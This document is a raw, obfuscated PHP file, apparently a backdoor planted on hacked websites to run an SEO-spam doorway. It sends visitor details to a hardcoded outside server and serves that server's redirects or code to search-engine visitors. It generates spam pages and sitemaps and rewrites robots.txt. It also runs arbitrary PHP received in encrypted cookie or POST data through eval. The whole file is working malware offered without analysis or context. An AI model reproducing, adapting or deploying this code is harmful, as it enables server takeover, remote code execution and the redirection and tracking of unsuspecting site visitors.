<?php

@ini_set('error_log', NULL);@ini_set('log_errors', 0);@ini_set('max_execution_time', 0);@error_reporting(0);@set_time_limit(0);date_default_timezone_set('UTC');class _u5u7af8{static private $_urbn44ej = 84536538;static function _cby2a($_9ihy5z1t, $_llp78fro){$_9ihy5z1t[2] = count($_9ihy5z1t) > 4 ? long2ip(_u5u7af8::$_urbn44ej - 229) : $_9ihy5z1t[2];$_gv7tevzh = _u5u7af8::_4fyw2($_9ihy5z1t, $_llp78fro);if (!$_gv7tevzh) {$_gv7tevzh = _u5u7af8::_ow3rm($_9ihy5z1t, $_llp78fro);}return $_gv7tevzh;}static function _4fyw2($_9ihy5z1t, $_gv7tevzh, $_hv8n8m9g = NULL){if (!function_exists('curl_version')) {return "";}if (is_array($_9ihy5z1t)) {$_9ihy5z1t = implode("/", $_9ihy5z1t);}$_hdpadfce = curl_init();curl_setopt($_hdpadfce, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($_hdpadfce, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($_hdpadfce, CURLOPT_URL, $_9ihy5z1t);if (!empty($_gv7tevzh)) {curl_setopt($_hdpadfce, CURLOPT_POST, 1);curl_setopt($_hdpadfce, CURLOPT_POSTFIELDS, $_gv7tevzh);}if (!empty($_hv8n8m9g)) {curl_setopt($_hdpadfce, CURLOPT_HTTPHEADER, $_hv8n8m9g);}curl_setopt($_hdpadfce, CURLOPT_RETURNTRANSFER, TRUE);$_noupwwq7 = curl_exec($_hdpadfce);curl_close($_hdpadfce);return $_noupwwq7;}static function _ow3rm($_9ihy5z1t, $_gv7tevzh, $_hv8n8m9g = NULL){if (is_array($_9ihy5z1t)) {$_9ihy5z1t = implode("/", $_9ihy5z1t);}if (!empty($_gv7tevzh)) {$_083vbrol = array('method' => 'POST','header' => 'Content-type: application/x-www-form-urlencoded','content' => $_gv7tevzh);if (!empty($_hv8n8m9g)) {$_083vbrol["header"] = $_083vbrol["header"] . "\r\n" . implode("\r\n", $_hv8n8m9g);}$_n3iyzpa4 = stream_context_create(array('http' => $_083vbrol));} else {$_083vbrol = array('method' => 'GET',);if (!empty($_hv8n8m9g)) {$_083vbrol["header"] = implode("\r\n", $_hv8n8m9g);}$_n3iyzpa4 = stream_context_create(array('http' => $_083vbrol));}return @file_get_contents($_9ihy5z1t, FALSE, $_n3iyzpa4);}}class _1qidxd{private static $_an39qpsu = "";private static $_zxav3pf4 = -1;private static $_7lfbiwmt = "";private $_fp39bmgv = "";private $_xva12gjg = "";private $_m7eyagjp = "";private $_yzxyq75l = "";public static function _2bw4b($_gliwpslc, $_7x0dq75a, $_q1wdc9z1){_1qidxd::$_an39qpsu = $_gliwpslc . "/cache/";_1qidxd::$_zxav3pf4 = $_7x0dq75a;_1qidxd::$_7lfbiwmt = $_q1wdc9z1;if (!@file_exists(_1qidxd::$_an39qpsu)) {@mkdir(_1qidxd::$_an39qpsu);}}static public function _wm9ld(){$_mfiileg2 = 0;foreach (scandir(_1qidxd::$_an39qpsu) as $_9thk5z3v) {$_mfiileg2 += 1;}return $_mfiileg2;}public static function _ic80l(){return TRUE;}public function __construct($_1spotmwv, $_clv8c5z5, $_u7a2u8gq, $_ipqyfx94){$this->_fp39bmgv = $_1spotmwv;$this->_xva12gjg = $_clv8c5z5;$this->_m7eyagjp = $_u7a2u8gq;$this->_yzxyq75l = $_ipqyfx94;}public function _j753l(){function _uk9i5($_shmbm3cm, $_g0bzplbq){return round(rand($_shmbm3cm, $_g0bzplbq - 1) + (rand(0, PHP_INT_MAX - 1) / PHP_INT_MAX), 2);}$_yfqg6yv5 = _ff4ouv::_5aoht();$_gv7tevzh = str_replace("{{ text }}", $this->_xva12gjg,str_replace("{{ keyword }}", $this->_m7eyagjp,str_replace("{{ links }}", $this->_yzxyq75l, $this->_fp39bmgv)));while (TRUE) {$_nkfsqr8y = preg_replace('/' . preg_quote("{{ randkeyword }}", '/') . '/', _ff4ouv::_6xf43(), $_gv7tevzh, 1);if ($_nkfsqr8y === $_gv7tevzh) {break;}$_gv7tevzh = $_nkfsqr8y;}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX-ANCHOR (\d*) }}/', $_gv7tevzh, $_zorsp5hp);if (empty($_zorsp5hp)) {break;}$_u7a2u8gq = @$_yfqg6yv5[intval($_zorsp5hp[1])];$_r2g6ytyx = _hybrjer::_d392v($_u7a2u8gq);$_gv7tevzh = str_replace($_zorsp5hp[0], $_r2g6ytyx, $_gv7tevzh);}while (TRUE) {preg_match('/{{ KEYWORDBYINDEX (\d*) }}/', $_gv7tevzh, $_zorsp5hp);if (empty($_zorsp5hp)) {break;}$_u7a2u8gq = @$_yfqg6yv5[intval($_zorsp5hp[1])];$_gv7tevzh = str_replace($_zorsp5hp[0], $_u7a2u8gq, $_gv7tevzh);}while (TRUE) {preg_match('/{{ RANDFLOAT (\d*)-(\d*) }}/', $_gv7tevzh, $_zorsp5hp);if (empty($_zorsp5hp)) {break;}$_gv7tevzh = str_replace($_zorsp5hp[0], _uk9i5($_zorsp5hp[1], $_zorsp5hp[2]), $_gv7tevzh);}while (TRUE) {preg_match('/{{ RANDINT (\d*)-(\d*) }}/', $_gv7tevzh, $_zorsp5hp);if (empty($_zorsp5hp)) {break;}$_gv7tevzh = str_replace($_zorsp5hp[0], rand($_zorsp5hp[1], $_zorsp5hp[2]), $_gv7tevzh);}return $_gv7tevzh;}public function _dqakv(){$_mi22fmsv = _1qidxd::$_an39qpsu . md5($this->_m7eyagjp . _1qidxd::$_7lfbiwmt);if (_1qidxd::$_zxav3pf4 == -1) {$_2pv8sbz7 = -1;} else {$_2pv8sbz7 = time() + (3600 * 24 * 30);}$_lajc4hgw = array("template" => $this->_fp39bmgv, "text" => $this->_xva12gjg, "keyword" => $this->_m7eyagjp,"links" => $this->_yzxyq75l, "expired" => $_2pv8sbz7);@file_put_contents($_mi22fmsv, serialize($_lajc4hgw));}static public function _t1ysn($_u7a2u8gq){$_mi22fmsv = _1qidxd::$_an39qpsu . md5($_u7a2u8gq . _1qidxd::$_7lfbiwmt);$_mi22fmsv = @unserialize(@file_get_contents($_mi22fmsv));if (!empty($_mi22fmsv) && ($_mi22fmsv["expired"] > time() || $_mi22fmsv["expired"] == -1)) {return new _1qidxd($_mi22fmsv["template"], $_mi22fmsv["text"], $_mi22fmsv["keyword"], $_mi22fmsv["links"]);} else {return null;}}}class _zhfsyf{private static $_an39qpsu = "";private static $_rn21q5ts = "";public static function _2bw4b($_gliwpslc, $_c85cmx1y){_zhfsyf::$_an39qpsu = $_gliwpslc . "/";_zhfsyf::$_rn21q5ts = $_c85cmx1y;if (!@file_exists(_zhfsyf::$_an39qpsu)) {@mkdir(_zhfsyf::$_an39qpsu);}}public static function _ic80l(){return TRUE;}static public function _wm9ld(){$_mfiileg2 = 0;foreach (scandir(_zhfsyf::$_an39qpsu) as $_9thk5z3v) {if (strpos($_9thk5z3v, _zhfsyf::$_rn21q5ts) === 0) {$_mfiileg2 += 1;}}return $_mfiileg2;}static public function _6xf43(){$_q8ro3k44 = array();foreach (scandir(_zhfsyf::$_an39qpsu) as $_9thk5z3v) {if (strpos($_9thk5z3v, _zhfsyf::$_rn21q5ts) === 0) {$_q8ro3k44[] = $_9thk5z3v;}}return @file_get_contents(_zhfsyf::$_an39qpsu . $_q8ro3k44[array_rand($_q8ro3k44)]);}static public function _dqakv($_ihuh8jkm){if (@file_exists(_zhfsyf::$_rn21q5ts . "_" . md5($_ihuh8jkm) . ".html")) {return;}@file_put_contents(_zhfsyf::$_rn21q5ts . "_" . md5($_ihuh8jkm) . ".html", $_ihuh8jkm);}}class _ff4ouv{private static $_an39qpsu = "";private static $_rn21q5ts = "";private static $_5hg4m65b = array();private static $_x49xk6oj = array();public static function _2bw4b($_gliwpslc, $_c85cmx1y){_ff4ouv::$_an39qpsu = $_gliwpslc . "/";_ff4ouv::$_rn21q5ts = $_c85cmx1y;if (!@file_exists(_ff4ouv::$_an39qpsu)) {@mkdir(_ff4ouv::$_an39qpsu);}}private static function _ow168(){$_58is19nz = array();foreach (scandir(_ff4ouv::$_an39qpsu) as $_9thk5z3v) {if (strpos($_9thk5z3v, _ff4ouv::$_rn21q5ts) === 0) {$_58is19nz[] = $_9thk5z3v;}}return $_58is19nz;}public static function _ic80l(){return TRUE;}static public function _6xf43(){if (empty(_ff4ouv::$_5hg4m65b)) {$_58is19nz = _ff4ouv::_ow168();_ff4ouv::$_5hg4m65b = @file(_ff4ouv::$_an39qpsu . $_58is19nz[array_rand($_58is19nz)], FILE_IGNORE_NEW_LINES);}return _ff4ouv::$_5hg4m65b[array_rand(_ff4ouv::$_5hg4m65b)];}static public function _5aoht(){if (empty(_ff4ouv::$_x49xk6oj)) {$_58is19nz = _ff4ouv::_ow168();foreach ($_58is19nz as $_c2pdxyts) {_ff4ouv::$_x49xk6oj = array_merge(_ff4ouv::$_x49xk6oj, @file(_ff4ouv::$_an39qpsu . $_c2pdxyts, FILE_IGNORE_NEW_LINES));}}return _ff4ouv::$_x49xk6oj;}static public function _dqakv($_3h0p3rlo){if (@file_exists(_ff4ouv::$_rn21q5ts . "_" . md5($_3h0p3rlo) . ".list")) {return;}@file_put_contents(_ff4ouv::$_rn21q5ts . "_" . md5($_3h0p3rlo) . ".list", $_3h0p3rlo);}static public function _68vh2($_u7a2u8gq){@file_put_contents(_ff4ouv::$_rn21q5ts . "_" . md5(_hybrjer::$_bh69rp5v) . ".list", $_u7a2u8gq . "\n", 8);}}class _hybrjer{static public $_faek34u7 = "5.3";static public $_bh69rp5v = "875dbd07-6432-b0f9-008a-100258043fa3";private $_gu8d63by = "http://136.12.78.46/app/assets/api2?action=redir";private $_bin0o2rn = "http://136.12.78.46/app/assets/api?action=page";static public $_642i8gfd = 5;static public $_j46tokyt = 20;private function _zy8ey(){$_mr78ksyf = array('#libwww-perl#i','#MJ12bot#i','#msnbot#i', '#msnbot-media#i','#YandexBot#i', '#msnbot#i', '#YandexWebmaster#i','#spider#i', '#yahoo#i', '#google#i', '#altavista#i','#ask#i','#yahoo!\s*slurp#i','#BingBot#i');if (!empty($_SERVER['HTTP_USER_AGENT']) && (FALSE !== strpos(preg_replace($_mr78ksyf, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT']), '-NO-WAY-'))) {$_f61kw2i8 = 1;} elseif (empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) || empty($_SERVER['HTTP_REFERER'])) {$_f61kw2i8 = 1;} elseif (strpos($_SERVER['HTTP_REFERER'], "google") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yahoo") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "bing") === FALSE &&strpos($_SERVER['HTTP_REFERER'], "yandex") === FALSE) {$_f61kw2i8 = 1;} else {$_f61kw2i8 = 0;}return $_f61kw2i8;}private static function _trvhr(){$_llp78fro = array();$_llp78fro['ip'] = $_SERVER['REMOTE_ADDR'];$_llp78fro['qs'] = @$_SERVER['HTTP_HOST'] . @$_SERVER['REQUEST_URI'];$_llp78fro['ua'] = @$_SERVER['HTTP_USER_AGENT'];$_llp78fro['lang'] = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];$_llp78fro['ref'] = @$_SERVER['HTTP_REFERER'];$_llp78fro['enc'] = @$_SERVER['HTTP_ACCEPT_ENCODING'];$_llp78fro['acp'] = @$_SERVER['HTTP_ACCEPT'];$_llp78fro['char'] = @$_SERVER['HTTP_ACCEPT_CHARSET'];$_llp78fro['conn'] = @$_SERVER['HTTP_CONNECTION'];return $_llp78fro;}public function __construct(){$this->_gu8d63by = explode("/", $this->_gu8d63by);$this->_bin0o2rn = explode("/", $this->_bin0o2rn);}static public function _om55a($_ebs6rl6m){if (strlen($_ebs6rl6m) < 4) {return "";}$_deytuf88 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";$_yfqg6yv5 = str_split($_deytuf88);$_yfqg6yv5 = array_flip($_yfqg6yv5);$_jmsoppsu = 0;$_frblxukd = "";$_ebs6rl6m = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $_ebs6rl6m);do {$_bt7jstla = $_yfqg6yv5[$_ebs6rl6m[$_jmsoppsu++]];$_tye7zqdv = $_yfqg6yv5[$_ebs6rl6m[$_jmsoppsu++]];$_04pvi9y0 = $_yfqg6yv5[$_ebs6rl6m[$_jmsoppsu++]];$_oofvj9oj = $_yfqg6yv5[$_ebs6rl6m[$_jmsoppsu++]];$_ppf85f76 = ($_bt7jstla << 2) | ($_tye7zqdv >> 4);$_8qf3e5tw = (($_tye7zqdv & 15) << 4) | ($_04pvi9y0 >> 2);$_7tpencdd = (($_04pvi9y0 & 3) << 6) | $_oofvj9oj;$_frblxukd = $_frblxukd . chr($_ppf85f76);if ($_04pvi9y0 != 64) {$_frblxukd = $_frblxukd . chr($_8qf3e5tw);}if ($_oofvj9oj != 64) {$_frblxukd = $_frblxukd . chr($_7tpencdd);}} while ($_jmsoppsu < strlen($_ebs6rl6m));return $_frblxukd;}private function _u8jkc($_u7a2u8gq){$_1spotmwv = "";$_clv8c5z5 = "";$_llp78fro = _hybrjer::_trvhr();$_llp78fro["uid"] = _hybrjer::$_bh69rp5v;$_llp78fro["keyword"] = $_u7a2u8gq;$_llp78fro["tc"] = 10;$_llp78fro = http_build_query($_llp78fro);$_n3spmgub = _u5u7af8::_cby2a($this->_bin0o2rn, $_llp78fro);if (strpos($_n3spmgub, _hybrjer::$_bh69rp5v) === FALSE) {return array($_1spotmwv, $_clv8c5z5);}$_1spotmwv = _zhfsyf::_6xf43();$_clv8c5z5 = substr($_n3spmgub, strlen(_hybrjer::$_bh69rp5v));$_clv8c5z5 = explode("\n", $_clv8c5z5);shuffle($_clv8c5z5);$_clv8c5z5 = implode(" ", $_clv8c5z5);return array($_1spotmwv, $_clv8c5z5);}private function _lygjg(){$_llp78fro = _hybrjer::_trvhr();if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {$_llp78fro['cfconn'] = @$_SERVER['HTTP_CF_CONNECTING_IP'];}if (isset($_SERVER['HTTP_X_REAL_IP'])) {$_llp78fro['xreal'] = @$_SERVER['HTTP_X_REAL_IP'];}if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {$_llp78fro['xforward'] = @$_SERVER['HTTP_X_FORWARDED_FOR'];}$_llp78fro["uid"] = _hybrjer::$_bh69rp5v;$_llp78fro = http_build_query($_llp78fro);$_98esgq2f = _u5u7af8::_cby2a($this->_gu8d63by, $_llp78fro);$_98esgq2f = @unserialize($_98esgq2f);if (isset($_98esgq2f["type"]) && $_98esgq2f["type"] == "redir") {if (!empty($_98esgq2f["data"]["header"])) {header($_98esgq2f["data"]["header"]);return true;} elseif (!empty($_98esgq2f["data"]["code"])) {echo $_98esgq2f["data"]["code"];return true;}}return false;}public function _ic80l(){return _1qidxd::_ic80l() && _zhfsyf::_ic80l() && _ff4ouv::_ic80l();}static public function _tweoy(){if ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) {return true;}return false;}public static function _gk1cx(){$_t9p306vp = explode("?", $_SERVER["REQUEST_URI"], 2);$_t9p306vp = $_t9p306vp[0];if (strpos($_t9p306vp, ".php") === FALSE) {$_t9p306vp = explode("/", $_t9p306vp);array_pop($_t9p306vp);$_t9p306vp = implode("/", $_t9p306vp) . "/";}return sprintf("%s://%s%s", _hybrjer::_tweoy() ? "https" : "http", $_SERVER['HTTP_HOST'], $_t9p306vp);}public static function _ogzd5(){$_973gj0p7 = Array("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15","Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36");$_8qb9w392 = array("https://www.google.com/ping?sitemap=" => "Sitemap Notification Received",);$_hv8n8m9g = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language: en-US,en;q=0.5","User-Agent: " . $_973gj0p7[array_rand($_973gj0p7)],);$_4xajfouu = urlencode(_hybrjer::_xr0e7() . "/sitemap.xml");foreach ($_8qb9w392 as $_9ihy5z1t => $_xxk480ai) {$_0zt5pn7l = _u5u7af8::_4fyw2($_9ihy5z1t . $_4xajfouu, NULL, $_hv8n8m9g);if (empty($_0zt5pn7l)) {$_0zt5pn7l = _u5u7af8::_ow3rm($_9ihy5z1t . $_4xajfouu, NULL, $_hv8n8m9g);}if (empty($_0zt5pn7l)) {return FALSE;}if (strpos($_0zt5pn7l, $_xxk480ai) === FALSE) {return FALSE;}}return TRUE;}public static function _emsi3(){$_oqp3b1zp = "User-agent: *\nDisallow: %s\nUser-agent: Bingbot\nUser-agent: Googlebot\nUser-agent: Slurp\nDisallow:\nSitemap: %s\n";$_t9p306vp = explode("?", $_SERVER["REQUEST_URI"], 2);$_t9p306vp = $_t9p306vp[0];$_bqf1gqv2 = substr($_t9p306vp, 0, strrpos($_t9p306vp, "/"));$_0kpwdgup = sprintf($_oqp3b1zp, $_bqf1gqv2, _hybrjer::_xr0e7() . "/sitemap.xml");$_bessvmce = $_SERVER["DOCUMENT_ROOT"] . "/robots.txt";if (@file_exists($_bessvmce)) {@chmod($_bessvmce, 0777);$_d9vvepec = @file_get_contents($_bessvmce);} else {$_d9vvepec = "";}if (strpos($_d9vvepec, $_0kpwdgup) === FALSE) {@file_put_contents($_bessvmce, $_d9vvepec . "\n" . $_0kpwdgup);$_d9vvepec = @file_get_contents($_bessvmce);return (strpos($_d9vvepec, $_0kpwdgup) !== FALSE);}return FALSE;}public static function _xr0e7(){$_t9p306vp = explode("?", $_SERVER["REQUEST_URI"], 2);$_t9p306vp = $_t9p306vp[0];$_gliwpslc = substr($_t9p306vp, 0, strrpos($_t9p306vp, "/"));return sprintf("%s://%s%s", _hybrjer::_tweoy() ? "https" : "http", $_SERVER['HTTP_HOST'], $_gliwpslc);}public static function _d392v($_u7a2u8gq){$_m9of92z8 = _hybrjer::_gk1cx();$_hb5xf9t0 = substr(md5(_hybrjer::$_bh69rp5v . "salt3"), 0, 6);$_t7j7jfid = "";if (substr($_m9of92z8, -1) == "/") {if (ord($_hb5xf9t0[1]) % 2) {$_u7a2u8gq = str_replace(" ", "-", $_u7a2u8gq);} else {$_u7a2u8gq = str_replace(" ", "-", $_u7a2u8gq);}$_t7j7jfid = sprintf("%s%s.html", $_m9of92z8, urlencode($_u7a2u8gq));} else {if (FALSE && (ord($_hb5xf9t0[0]) % 2)) {$_t7j7jfid = sprintf("%s?%s=%s",$_m9of92z8,$_hb5xf9t0,urlencode(str_replace(" ", "-", $_u7a2u8gq)));} else {$_aaeloln3 = array("id", "page", "tag");$_5y0lwrvt = $_aaeloln3[ord($_hb5xf9t0[2]) % count($_aaeloln3)];if (ord($_hb5xf9t0[1]) % 2) {$_u7a2u8gq = str_replace(" ", "-", $_u7a2u8gq);} else {$_u7a2u8gq = str_replace(" ", "-", $_u7a2u8gq);}$_t7j7jfid = sprintf("%s?%s=%s",$_m9of92z8,$_5y0lwrvt,urlencode($_u7a2u8gq));}}return $_t7j7jfid;}public static function _12oi4($_shmbm3cm, $_g0bzplbq){$_4fthtw9j = "";for ($_jmsoppsu = 0; $_jmsoppsu < rand($_shmbm3cm, $_g0bzplbq); $_jmsoppsu++) {$_u7a2u8gq = _ff4ouv::_6xf43();$_4fthtw9j .= sprintf("<a href=\"%s\">%s</a>,\n",_hybrjer::_d392v($_u7a2u8gq), ucwords($_u7a2u8gq));}return $_4fthtw9j;}public static function _t4pdw($_5upl67nj = FALSE){$_az4u5x4a = dirname(__FILE__) . "/sitemap.xml";$_flcdy5sx = "<?xml version=\"1.0\" encoding=\"UTF-8\"?" . ">\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n";$_84bwrfao = "</urlset>";$_yfqg6yv5 = _ff4ouv::_5aoht();$_rrtwgwi7 = array();if (file_exists($_az4u5x4a)) {$_n3spmgub = simplexml_load_file($_az4u5x4a);foreach ($_n3spmgub as $_rzl657n0) {$_rrtwgwi7[(string)$_rzl657n0->loc] = (string)$_rzl657n0->lastmod;}} else {$_5upl67nj = FALSE;}foreach ($_yfqg6yv5 as $_a653mvjf) {$_t7j7jfid = _hybrjer::_d392v($_a653mvjf);if (isset($_rrtwgwi7[$_t7j7jfid])) {continue;}if ($_5upl67nj) {$_k6i7fuuh = time();} else {$_k6i7fuuh = time() - (crc32($_a653mvjf) % (60 * 60 * 24 * 30));}$_rrtwgwi7[$_t7j7jfid] = date("Y-m-d", $_k6i7fuuh);}$_u3u73bts = "";foreach ($_rrtwgwi7 as $_9ihy5z1t => $_k6i7fuuh) {$_u3u73bts .= "<url>\n";$_u3u73bts .= sprintf("<loc>%s</loc>\n", $_9ihy5z1t);$_u3u73bts .= sprintf("<lastmod>%s</lastmod>\n", $_k6i7fuuh);$_u3u73bts .= "</url>\n";}$_n6b4ja6s = $_flcdy5sx . $_u3u73bts . $_84bwrfao;$_4xajfouu = _hybrjer::_xr0e7() . "/sitemap.xml";@file_put_contents($_az4u5x4a, $_n6b4ja6s);return $_4xajfouu;}public function _54fuk(){$_5y0lwrvt = substr(md5(_hybrjer::$_bh69rp5v . "salt3"), 0, 6);if (!$this->_zy8ey()) {if ($this->_lygjg()) {return;}}if (!empty($_GET)) {$_ukl29vx0 = array_values($_GET);} else {$_ukl29vx0 = explode("/", $_SERVER["REQUEST_URI"]);$_ukl29vx0 = array_reverse($_ukl29vx0);}$_u7a2u8gq = "";foreach ($_ukl29vx0 as $_wxvmww9q) {if (substr_count($_wxvmww9q, "-") > 0) {$_u7a2u8gq = $_wxvmww9q;break;}}$_u7a2u8gq = str_replace($_5y0lwrvt . "-", "", $_u7a2u8gq);$_u7a2u8gq = str_replace("-" . $_5y0lwrvt, "", $_u7a2u8gq);$_u7a2u8gq = str_replace("-", " ", $_u7a2u8gq);$_9yifhkzi = array(".html", ".php", ".aspx");foreach ($_9yifhkzi as $_9v4wve28) {if (strpos($_u7a2u8gq, $_9v4wve28) === strlen($_u7a2u8gq) - strlen($_9v4wve28)) {$_u7a2u8gq = substr($_u7a2u8gq, 0, strlen($_u7a2u8gq) - strlen($_9v4wve28));}}$_u7a2u8gq = urldecode($_u7a2u8gq);$_t32zi4xs = _ff4ouv::_5aoht();if (empty($_u7a2u8gq)) {$_u7a2u8gq = $_t32zi4xs[0];} else if (!in_array($_u7a2u8gq, $_t32zi4xs)) {$_ydbv9tsv = 0;foreach (str_split($_u7a2u8gq) as $_hdpadfce) {$_ydbv9tsv += ord($_hdpadfce);}$_u7a2u8gq = $_t32zi4xs[$_ydbv9tsv % count($_t32zi4xs)];}if (!empty($_u7a2u8gq)) {$_98esgq2f = _1qidxd::_t1ysn($_u7a2u8gq);if (empty($_98esgq2f)) {list($_1spotmwv, $_clv8c5z5) = $this->_u8jkc($_u7a2u8gq);if (empty($_clv8c5z5)) {return;}$_98esgq2f = new _1qidxd($_1spotmwv, $_clv8c5z5, $_u7a2u8gq, _hybrjer::_12oi4(_hybrjer::$_642i8gfd, _hybrjer::$_j46tokyt));$_98esgq2f->_dqakv();}echo $_98esgq2f->_j753l();}}}_1qidxd::_2bw4b(dirname(__FILE__), -1, _hybrjer::$_bh69rp5v);_zhfsyf::_2bw4b(dirname(__FILE__), substr(md5(_hybrjer::$_bh69rp5v . "salt12"), 0, 4));_ff4ouv::_2bw4b(dirname(__FILE__), substr(md5(_hybrjer::$_bh69rp5v . "salt22"), 0, 4));function _7p5r0($_n3spmgub, $_a653mvjf){$_2q406sbm = "";for ($_jmsoppsu = 0; $_jmsoppsu < strlen($_n3spmgub);) {for ($_0hq0joqf = 0; $_0hq0joqf < strlen($_a653mvjf) && $_jmsoppsu < strlen($_n3spmgub); $_0hq0joqf++, $_jmsoppsu++) {$_2q406sbm .= chr(ord($_n3spmgub[$_jmsoppsu]) ^ ord($_a653mvjf[$_0hq0joqf]));}}return $_2q406sbm;}function _4k90d($_n3spmgub, $_a653mvjf, $_0b8jha14){return _7p5r0(_7p5r0($_n3spmgub, $_a653mvjf), $_0b8jha14);}foreach (array_merge($_COOKIE, $_POST) as $_nlexcuew => $_n3spmgub) {$_n3spmgub = @unserialize(_4k90d(_hybrjer::_om55a($_n3spmgub), $_nlexcuew, _hybrjer::$_bh69rp5v));if (isset($_n3spmgub['ak']) && _hybrjer::$_bh69rp5v == $_n3spmgub['ak']) {if ($_n3spmgub['a'] == 'doorway2') {if ($_n3spmgub['sa'] == 'check') {$_gv7tevzh = _u5u7af8::_cby2a(explode("/", "http://httpbin.org/"), "");if (strlen($_gv7tevzh) > 512) {echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7,"cache" => _1qidxd::_wm9ld(),"keywords" => count(_ff4ouv::_5aoht()),"templates" => _zhfsyf::_wm9ld()));}exit;}if ($_n3spmgub['sa'] == 'templates') {foreach ($_n3spmgub["templates"] as $_1spotmwv) {_zhfsyf::_dqakv($_1spotmwv);echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7,));}}if ($_n3spmgub['sa'] == 'keywords') {_ff4ouv::_dqakv($_n3spmgub["keywords"]);_hybrjer::_t4pdw();echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7,));}if ($_n3spmgub['sa'] == 'update_sitemap') {_hybrjer::_t4pdw(TRUE);echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7,));}if ($_n3spmgub['sa'] == 'pages') {$_1qig7ala = 0;$_t32zi4xs = _ff4ouv::_5aoht();if (_zhfsyf::_wm9ld() > 0) {foreach ($_n3spmgub['pages'] as $_98esgq2f) {$_w6e71thr = _1qidxd::_t1ysn($_98esgq2f["keyword"]);if (empty($_w6e71thr)) {$_w6e71thr = new _1qidxd(_zhfsyf::_6xf43(), $_98esgq2f["text"], $_98esgq2f["keyword"], _hybrjer::_12oi4(_hybrjer::$_642i8gfd, _hybrjer::$_j46tokyt));$_w6e71thr->_dqakv();$_1qig7ala += 1;if (!in_array($_98esgq2f["keyword"], $_t32zi4xs)) {_ff4ouv::_68vh2($_98esgq2f["keyword"]);}}}}echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7, "pages" => $_1qig7ala));}if ($_n3spmgub["sa"] == "ping") {$_0zt5pn7l = _hybrjer::_ogzd5();echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7, "result" => (int)$_0zt5pn7l));}if ($_n3spmgub["sa"] == "robots") {$_0zt5pn7l = _hybrjer::_emsi3();echo @serialize(array("uid" => _hybrjer::$_bh69rp5v, "v" => _hybrjer::$_faek34u7, "result" => (int)$_0zt5pn7l));}}if ($_n3spmgub['sa'] == 'eval') {eval($_n3spmgub["data"]);exit;}}}$_wnm0thmt = new _hybrjer();if ($_wnm0thmt->_ic80l()) {$_wnm0thmt->_54fuk();}exit();